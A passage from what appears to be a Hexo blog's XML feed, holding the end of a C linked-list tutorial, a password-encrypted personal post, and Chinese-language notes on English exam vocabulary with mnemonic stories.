class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义链表头节点指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">head</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素到链表尾部</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个新节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">new_node</span> =</span> (<span class="keyword">struct</span> node*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">    new_node-&gt;data = value;</span><br><span class="line">    new_node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果链表为空，则新节点成为头节点</span></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        head = new_node;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到链表最后一个节点，并将新节点连接到其后面</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">current</span> =</span> head;</span><br><span class="line">    <span class="keyword">while</span> (current-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从链表中删除指定元素</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果链表为空，则无需删除</span></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果头节点是要删除的元素，则将头节点指向下一个节点</span></span><br><span class="line">    <span class="keyword">if</span> (head-&gt;data == value) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">temp</span> =</span> head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到要删除的元素的前一个节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">current</span> =</span> head;</span><br><span class="line">    <span class="keyword">while</span> (current-&gt;next != <span class="literal">NULL</span> &amp;&amp; current-&gt;next-&gt;data != value) &#123;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果找到了要删除的元素，则将其从链表中删除</span></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">temp</span> =</span> current-&gt;next;</span><br><span class="line">        current-&gt;next = current-&gt;next-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印链表元素</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">current</span> =</span> head;</span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, current-&gt;data);</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 向链表中插入元素</span></span><br><span class="line">    insert(<span class="number">1</span>);</span><br><span class="line">    insert(<span class="number">2</span>);</span><br><span class="line">    insert(<span class="number">3</span>);</span><br><span class="line">    insert(<span class="number">4</span>);</span><br><span class="line">    insert(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;链表初始元素：&quot;</span>);</span><br><span class="line">    print();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除元素</span></span><br><span class="line">    delete(<span class="number">3</span>);</span><br><span class="line">    delete(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;删除元素后的链表：&quot;</span>);</span><br><span class="line">    print();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run下：<br><img src="https://s2.loli.net/2023/03/14/FKsYICryxhaD1iT.png" alt="image-20230314121355286.png"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>累了就好好睡一觉吧</title>
      <link href="/2023/03/14/%E9%9F%A9%E5%89%A7%20-%20%E4%BB%A5%E5%90%BE%E4%B9%8B%E5%90%8D/"/>
      <url>/2023/03/14/%E9%9F%A9%E5%89%A7%20-%20%E4%BB%A5%E5%90%BE%E4%B9%8B%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="0900d1aa3f2040a09e13e7645f71aba000a72a1cc121db3a00696054ecfc877c">1568516ebde37eb749650619e089fd15a531a77131313ee21948ad805ed0f31e07c4c6f0b70409b326a1c30fefe828e7e15b9e4a6492b9bf16349b3be553c8a4d1f2a1f1f9709bea0807b44a018bd004ec5a67f4112675c18022a75b79715a282609840cc80c271499fed7af1c7da21470e7651602cb7c8bd4f7f46d3d1ff9d0e1a2574e4295fd91977b3bfdf6430fb7372c0443d29224682f6eb15b6c4c98cececd71caa27c9ffa3a18e4a3ad23f6dc588718073e58c0059c1e18e3baf2f7889cdfc3b6af6c7b2a337dc03a120dbea86943c6faa279467fb538bec29939fae3dd7dab60d98123590a0b96c95d1b7f8fa4a0adb67246894d84b5c4da77e2c94cf18bae152afad11a30cbb71817ddf9ed878e360681183f28b96fcfcf96f1039940803d8a4c33b2a4eaa0d0353bd005587d702ad901eb588e562d7725e409490d725bb63780833fbb27bf77b4fed4ff5ce96cc9e29e7d536da4aaf8e0494dfa5f576a358e1c00fb94d5e8fcbed2c1b27cdcf5c4aff8875916b9d985303c6e7f535844d3df0dece0f7d3f1fa549f03e4e71f1cf7cce4e91eb0f71f582853fd1342</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey，password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Reflections on life | 人生上的思考 | 生活杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>英语考研单词联想记忆笔记-003</title>
      <link href="/2023/03/14/%E8%8B%B1%E8%AF%AD%E8%80%83%E7%A0%94%E5%8D%95%E8%AF%8D%E8%81%94%E6%83%B3%E8%AE%B0%E5%BF%86%E7%AC%94%E8%AE%B0-003/"/>
      <url>/2023/03/14/%E8%8B%B1%E8%AF%AD%E8%80%83%E7%A0%94%E5%8D%95%E8%AF%8D%E8%81%94%E6%83%B3%E8%AE%B0%E5%BF%86%E7%AC%94%E8%AE%B0-003/</url>
      
        <content type="html"><![CDATA[<p>2023&#x2F;03&#x2F;09 </p><p>Group 01</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1、escapev.逃跑，逃脱；退出；避开，避免；渗出； n.逃脱，逃避；泄露；退出键；</span><br><span class="line">2、especiallyadv.特别地，尤其；专门；非常；</span><br><span class="line">3、essayn.文章；散文； v.企图，尝试；</span><br><span class="line">4、essencen.精髓，精油；本质；</span><br><span class="line">5、essentialadj.必不可少的，极其重要的；基本的，本质的； n.必需品；要点，要素；</span><br><span class="line">6、establishv.建立，创立；使得到承认的；确定；使立足；建立（联系）；</span><br><span class="line">7、estimaten.估计，估算；评价，判断；预算书； v.估计，估价，估算；判断，评价；</span><br><span class="line">8、ethicn.道德体系，行为准则；</span><br><span class="line">9、ethnicadj.民族的，种族的；少数民族的；异国风味的；</span><br><span class="line">10、evaluatev.估值，评价，评估；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  从前，有一个年轻人想要(escape)离开他的家乡，去寻找更好的机会。他(especially)想要尝试写一篇(essay)，来表达他内心的想法和感受。</span><br><span class="line">他相信，写作是发掘灵魂(essence)的一种方式，也是他实现梦想的一步。</span><br><span class="line">但是，他发现自己缺少一些(essential)工具和技能，所以他决定去(establish)一个学习小组，学习写作和其他(ethic)的知识和技能。</span><br><span class="line">在这个小组中，他结交了一些志同道合的朋友，他们一起讨论、学习和成长。</span><br><span class="line">在这个小组的帮助下，这个年轻人写了一篇关于自己成长经历的(essay)，他深入探讨了自己的内心和(ethnic)背景，以及如何克服各种困难。</span><br><span class="line">他们互相评估和(estimate)自己的作品，提出改进意见，使得这篇文章更加完美。</span><br><span class="line">最终，这个年轻人成功地(establish)了自己的写作生涯，并且成为一名受人尊敬的作家。他发现，通过不断的学习和(evaluate)自己的作品，他能够不断提高自己的能力和水平。</span><br></pre></td></tr></table></figure><p>Group 02</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、industrialadj.工业的；</span><br><span class="line">2、industrializev.(使)工业化；</span><br><span class="line">3、industryn.行业；工业；勤劳，勤奋；</span><br><span class="line">4、inevitableadj.不可避免的； n.不可避免的事情；</span><br><span class="line">5、miserableadj.痛苦的；乖戾的；少得可怜的；令人难受的；</span><br><span class="line">6、miseryn.痛苦；穷困；</span><br><span class="line">7、misleadv.误导，引入歧途；</span><br><span class="line">8、mixn.混合，结合；混合原料；混录； v.混合，搅拌；配制；交往，结合；混合录制；</span><br><span class="line">9、mixturen.混合，结合体；混合物；</span><br><span class="line">10、necessaryadj.必需的，必要的；必然的，势必的；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  在一个偏远的村庄里，人们一直以来都过着简单的生活。但随着时间的推移，难以避免的(inevitable)变化开始出现了。</span><br><span class="line">一天，一位商人来到村庄，提出要在这里建立一家(industrial)工厂。</span><br><span class="line">商人声称这个工厂会带来许多好处，比如创造就业机会、提高村庄的经济水平等等。</span><br><span class="line">于是，村庄里的人们开始积极地支持这个商人，希望他能够实现他的计划并让这个村庄变得更加繁荣。</span><br><span class="line">商人开始着手(industrialize)建立这家工厂，他聘请了很多工人和技术人员，并在村庄周围建造了大型的建筑物。</span><br><span class="line">不过，这个过程并不是一帆风顺的。在建造过程中，他们遇到了很多问题和困难，导致工厂的建造进度一直拖延。</span><br><span class="line">同时，工厂建设给村庄带来了一些负面影响。建筑噪音、污染和交通问题等等都让村庄的生活变得非常(miserable)。</span><br><span class="line">人们开始感到痛苦和不安，他们意识到自己的选择可能会给自己带来很多( mislead)。</span><br><span class="line">最终，商人和村庄的人们达成了一个妥协方案。他们决定在工厂周围种植一些植物，以减少污染的影响，并且采取其他措施来保护环境。</span><br><span class="line">同时，他们也开始探索更好的混合(mix)方式，以使生活更加美好。通过努力，他们最终克服了困难，找到了一种合适的(mixture)方式来平衡工业发展和环境保护。</span><br><span class="line">这样一来，工业化带来的好处也开始慢慢地显现出来，这个村庄开始迎来了更加美好的明天。</span><br></pre></td></tr></table></figure><p>Group 03</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1、necessitatev.使成为必要；</span><br><span class="line">2、necessityn.必要；必需品；必然性；</span><br><span class="line">3、negativeadj.负面的，消极的；有害的；呈阴性的；负极的；小于零的；否定的； n.拒绝；底片；阴性或否定的结果；</span><br><span class="line">4、negotiatev.谈判；通过，越过；商定；</span><br><span class="line">5、outeradj.外边的，外围的；外表的；</span><br><span class="line">6、outletn.专卖店，直销店；折扣店；发泄途径；出口；插座；</span><br><span class="line">7、outlinev.勾勒出......的轮廓；概述，概要； n.轮廓，外形；概述，概要；</span><br><span class="line">8、outlookn.观点；前景，可能性；景色；</span><br><span class="line">9、outputn.产量，输出量；输出； v.输出；</span><br><span class="line">10、povertyn.贫穷，贫困；贫乏；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  在一个偏远的村庄里，有一户人家生活十分贫困（poverty）。为了养活家庭，他们不得不出售自己的土地和房子，将所有的积蓄都花在了生计上。</span><br><span class="line">生活的压力使得他们不得不寻找新的收入来源。然而，这个村庄是一个交通闭塞的地方，人们的日常需求难以满足（necessity）。</span><br><span class="line">为了改善生活状况，他们需要与城市的商家谈判（negotiate），希望能够将自己生产的物品出售到城市。</span><br><span class="line">这需要他们学习新的技能和知识，以便生产出更好的产品，这一切都需要进行大量的输出(output)。</span><br><span class="line">然而，这个村庄的外围(outer)地带没有任何出口(outlet)通向城市，他们不得不长时间地徒步穿越山区，寻找销售机会。</span><br><span class="line">这个过程充满了困难和挑战，需要他们耐心和勇气，因为有时候，他们会遭遇到负面的(negative)情况，有人会拒绝(negative)购买他们的产品。</span><br><span class="line">但是他们不放弃，勾勒出(outline)了自己的计划和目标，坚持不懈地推销自己的产品。</span><br><span class="line">尽管经历了很多困难，但他们的努力终于得到了回报，生活状况得到了改善，他们的家庭也得到了更好的发展前景(outlook)。</span><br></pre></td></tr></table></figure><p>Group 04</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、powern.权力；力量；电力供应；控制力；能力；能源；强国；能，能量，功率； v.给......提供能量；</span><br><span class="line">2、practicaladj.实际的；有用的；切实可行的，实践的； n.实践课；</span><br><span class="line">3、practicen.惯例；实践；做法；专业工作；练习； v.从事；经常做；练习；</span><br><span class="line">4、practisev.练习；奉行，实践；从事；</span><br><span class="line">5、practitionern.从业人员，执业医生；</span><br><span class="line">6、preachv.鼓吹；说教；讲道，布道；</span><br><span class="line">7、precedev.处在......之前，先于；</span><br><span class="line">8、precautionn.预防措施，防备；</span><br><span class="line">9、precedentn.判例；前例，先例；惯例；</span><br><span class="line">10、precedingadj.前面的 v.先于；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  小明是一位非常有野心的年轻人，他希望能够成为一名成功的企业家，掌握着（power）和（practical）的双重能力，</span><br><span class="line">因此他决定要通过（practice）来不断地提升自己。</span><br><span class="line">他深知只有不断地（practise）才能使他的能力得到提高。小明决定去找一位成功的商业（practitioner）向他请教，</span><br><span class="line">这位商人告诉他：“成功的秘诀就是不断地（practice），然后将所学到的知识和技能付诸实践，不要只是空谈而不做实事。”</span><br><span class="line">这个经验也（precede）了小明自己的想法。他明白了只有不断地努力才能够成就大事业，因此他开始制定一系列的（precaution）措施，以避免犯错误。</span><br><span class="line">小明知道成功者的（precedent）和（preceding）经验都是他学习的好素材，他要不断地学习和借鉴，为自己的未来打好基础。</span><br></pre></td></tr></table></figure><p>Group 05</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、preciousadj.宝贵的，珍稀的；过分讲究的；</span><br><span class="line">2、preciseadj.明确的；准确的，精确的；</span><br><span class="line">3、precisionn.精确，细致；</span><br><span class="line">4、stressn.压力，应力；强调；紧张；重音；精神压力，心理负担； v.强调，着重；</span><br><span class="line">5、stretchn.一片；伸展；一段时间；弹性； v.延申，延续；伸展，舒展；持续；耗尽；</span><br><span class="line">6、holy     adj.神圣的；虔诚的；</span><br><span class="line">7、honorv.尊重，表示敬意；给与表扬； n.荣幸，荣誉；尊敬；正义感；法官大人；</span><br><span class="line">8、honorableadj.光荣的；可敬的；高贵的；</span><br><span class="line">9、horizonn.地平线；眼界；</span><br><span class="line">10、horizontaladj.水平的，横的； n.水平位置的；水平线，水平面；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  小芳是一个非常珍惜时间的人，她深知时间是多么（precious）而宝贵，因此她总是保持（precise）地计划和管理自己的时间。</span><br><span class="line">她也注重细节和（precision），因为她相信只有做好了每一个小细节，才能达成更大的目标。</span><br><span class="line">但是，最近她工作压力过大，使得她感受到了巨大的（stress）。她意识到她需要放松一下，所以她决定去做瑜伽来（stretch）和放松自己的身体和心灵。</span><br><span class="line">在她的瑜伽课上，她遇到了一位非常（holy）和（honorable）的老师。她对老师非常尊敬，因为老师总是给予她最大的（honor）和尊重。</span><br><span class="line">老师也教会了她如何平衡自己的生活和工作，让她看到了更广阔的（horizon）。</span><br><span class="line">小芳现在感到非常幸福和满足，因为她拥有了一种平衡的生活方式，并且能够将自己的时间和精力用在最（honorable）和（precise）的事情上，从而实现了自己的梦想。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 英语考研单词联想记忆笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>英语考研单词联想记忆笔记-002</title>
      <link href="/2023/03/14/%E8%8B%B1%E8%AF%AD%E8%80%83%E7%A0%94%E5%8D%95%E8%AF%8D%E8%81%94%E6%83%B3%E8%AE%B0%E5%BF%86%E7%AC%94%E8%AE%B0-002/"/>
      <url>/2023/03/14/%E8%8B%B1%E8%AF%AD%E8%80%83%E7%A0%94%E5%8D%95%E8%AF%8D%E8%81%94%E6%83%B3%E8%AE%B0%E5%BF%86%E7%AC%94%E8%AE%B0-002/</url>
      
        <content type="html"><![CDATA[<p>2023&#x2F;03&#x2F;08</p><h1 align="center">妇女节（Women's Day）</h1><img alt="GIF" src="https://s2.loli.net/2023/03/08/jo89acqKvb5NJdM.png" width="200" heigh="200" align="left"><br>Group 01<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、stun         v.使震惊；使昏迷；</span><br><span class="line">2、primaryadj.首要的，重要的；小学的；原发性的；基本的；最初的，最早的；初级的，初等的； n.初选；</span><br><span class="line">3、primev.事先指点； n.全盛时期； adj.首要的，基本的；最优的；最典型的；</span><br><span class="line">4、primitiveadj.原始的，远古的；发展水平低的； n.文艺复兴前的艺术家（或作品）；</span><br><span class="line">5、principaladj.首要的，主要的； n.资本，本金；大学校长；</span><br><span class="line">6、principlen.法则，原则；定律；道德原则；</span><br><span class="line">7、psychiatryn.精神病学；</span><br><span class="line">8、psychologyn.心理学；心理，心理影响；</span><br><span class="line">9、liabilityn.债务；累赘；责任；</span><br><span class="line">10、liableadj.负有法律责任的；有......倾向的；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  小明（primary）是一个学习成绩优秀的初中生。他的老师发现他的成绩非常好，但他在班级中有时候会显得有些“不一样”，有些孤僻。</span><br><span class="line">老师建议他去看心理医生（psychiatry），了解一下他内心的想法。于是小明去了精神病医院。</span><br><span class="line">在那里，他遇到了一位专业的心理医生，医生跟他聊了很多，帮助他发现了一些自己不曾意识到的问题。</span><br><span class="line">医生告诉小明，有时候成绩好的学生在学习上有压力，需要寻求一些方法来缓解压力，避免过度（liability）累赘。</span><br><span class="line">医生建议小明多参加一些课外活动，进行一些有益的运动，这样能够缓解他的压力，同时也能有更好的心理健康（psychology）状况。</span><br><span class="line">小明听了医生的建议，感觉很有道理，他决定在未来的学习生活中更加注重自己的心理健康，把握好自己的学习（prime）和生活（primitive）方向，做一个成熟（principal）的人。</span><br></pre></td></tr></table></figure><p>Group 02</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1、liberaladj.人文的；自由开放的；慷慨的；开明的；笼统的； n.自由党成员；开明者‘自由主义者；</span><br><span class="line">2、liberatev.解放（城市、国家等）；使解脱；</span><br><span class="line">3、licensev.批准，许可；n.证，证件；</span><br><span class="line">4、innocentadj.没有恶意的；天真无邪的，无恶意的；无罪的；无辜的； n.单纯的人；</span><br><span class="line">5、innovationn.创新，创造；新事物，新方法；</span><br><span class="line">6、anguishn.悲痛、剧情；</span><br><span class="line">7、annoyv.使恼怒；打扰；</span><br><span class="line">8、annualadj.每年的；一年的； n.一年生植物；年刊，年鉴；</span><br><span class="line">9、anchorn.主持人；锚；精神支柱； v.使固定；抛锚；使基于；主持；</span><br><span class="line">10、confinev.限制，限定；监禁，关押； n.界限，限制；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  小明是一位自由主义者（liberal），他希望所有人都能够获得真正的自由和平等。</span><br><span class="line">他经常参加各种活动，以争取更多的自由和权利。他相信，只有当人们获得自由时，他们才能真正地感到幸福和满足。</span><br><span class="line">最近，小明参加了一场示威活动，呼吁政府解放（liberate）那些被监禁的政治犯。</span><br><span class="line">他相信每个人都应该有言论自由和公正的审判。在他参加示威期间，他忘记了带身份证（license），被警察扣了下来。</span><br><span class="line">他对自己的无辜（innocent）感到很困惑，因为他觉得自己没有做错任何事情。</span><br><span class="line">最后，警察释放了他，但他感到非常的痛苦（anguish）。他认为，这种无辜的人遭受不公正的待遇，是一种对人权和自由的侵犯。</span><br><span class="line">回到家后，他想出了一种新的策略，以创新（innovation）的方式推动自由主义的事业。他决定发起一个年度（annual）的活动，以此来呼吁更多的人关注自由和人权的问题，并且希望通过这样的努力来打破固有的（confine）束缚，为更多的人争取自由和权利。</span><br><span class="line">这个活动得到了很多人的支持，每年都有越来越多的人加入进来。小明在这个活动中扮演了重要的角色，就像一枚锚（anchor）一样，为活动提供了精神支柱。</span><br></pre></td></tr></table></figure><p>Group 03</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、confirmv.证实，确认；认可，批准；确定；为......施坚信礼；使确信；</span><br><span class="line">2、conflictv.冲突，抵触； n.争执；冲突；战斗；矛盾；</span><br><span class="line">3、confidencen.信心，信任；自信；秘密；</span><br><span class="line">4、confidentadj.自信的，有信心的；肯定的，有把握的；</span><br><span class="line">5、confidentialadj.机密的；隐秘的；</span><br><span class="line">6、configuration  n.格局，布局，结构；配置；</span><br><span class="line">7、trailn.足迹，踪迹；小路，小道；路线，路径；线索； v.跟踪；拖；没精打采地走；落后，失利；追踪；</span><br><span class="line">8、trainv.训练，培训；瞄准；修整； n.火车；队列；（一）系列；</span><br><span class="line">9、trainingn.训练，培训； v.训练（train的现在分词）；</span><br><span class="line">10、traitn.特性，品质；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  小寒（confidential）是一位运动员，他在学校参加了一场比赛，以顶尖的表现赢得了胜利。</span><br><span class="line">小寒对自己的能力很有自信（confident），他相信自己在未来的比赛中也可以表现出色。</span><br><span class="line">他的教练也对他充满信心（confidence），并为他制定了一个新的训练计划（training）。</span><br><span class="line">教练告诉小明，在下一次比赛中，他需要更加注重他的步伐和姿态（configuration），因为这是他前进的方向（trail）和成功的关键。</span><br><span class="line">小寒听从教练的建议，专注于训练（train），并且逐渐发展出了优秀的技能特点（trait）。</span><br><span class="line">在下一次比赛中，小寒再次获得了胜利，这一次他证实了他的自信和实力（confirm），并获得了更多的赞誉。</span><br></pre></td></tr></table></figure><p>Group 04</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、view        v.观点，想法；视野，景色； v.考虑，看待；查看；观看；</span><br><span class="line">2、viewpoitn.观点，看法；角度，视角；</span><br><span class="line">3、violencen.暴力，暴行；强烈的力量；</span><br><span class="line">4、violentadj.暴力的，强暴的；</span><br><span class="line">5、virtualadj.很接近的，事实上的；虚拟的；</span><br><span class="line">6、virtuen.优点，好处；德行；美德；</span><br><span class="line">7、apparentadj.显而易见的，明白的；表面上的；</span><br><span class="line">8、appealn.上诉；呼吁，请求；吸引力； v.有吸引力；呼吁，恳求；上诉；</span><br><span class="line">9、appearv.显得；出现；出版，播出；似乎，好像；到达；</span><br><span class="line">10、appearancen.外观；出席，露面；表象；出现，起源；</span><br><span class="line"></span><br><span class="line">小故事：</span><br><span class="line">  有一对年轻夫妇，他们在一个山丘上建了一座小屋。他们选择这个地方是因为这里的景色非常优美，可以看到远处的山峰和蓝天白云的美景，是他们的心灵乐土。每天早上，夫妇俩都会到山丘上散步，享受大自然的美景（view）。他们有不同的观点（viewpoint）和兴趣爱好，但是他们总是能够和平共处，互相尊重对方的想法。他们深知，用暴力（violence）去解决问题永远不是最好的方法，而是需要有耐心和理解。</span><br><span class="line">虽然他们非常喜欢这个地方，但是他们也知道这里有时候会有野生动物的出没，有时候也会有暴力的天气。但是，他们并没有因此而离开，他们相信这个地方是非常适合居住的。在这个虚拟的（virtual）世界中，他们认为自己拥有着幸福的生活。</span><br><span class="line">这对夫妇有着许多美好的品质，其中最重要的是他们的美德（virtue）。他们总是尽最大的努力去帮助那些需要帮助的人，即使是一些陌生人。他们也深知，表面上（apparent）的一些事情并不总是真实的，所以他们总是试图去深入了解事物的本质。</span><br><span class="line">尽管他们的生活看起来很简单，但是他们的生活却充满了吸引力（appeal）和意义。他们出现（appear）在这个山丘上，为了追求自己的幸福，同时也要照顾和保护这个美丽的地方。他们的外观（appearance）虽然朴素，但是他们的内心却是充满着勇气和智慧。</span><br></pre></td></tr></table></figure><p>Group 05</p><figure class="highlight 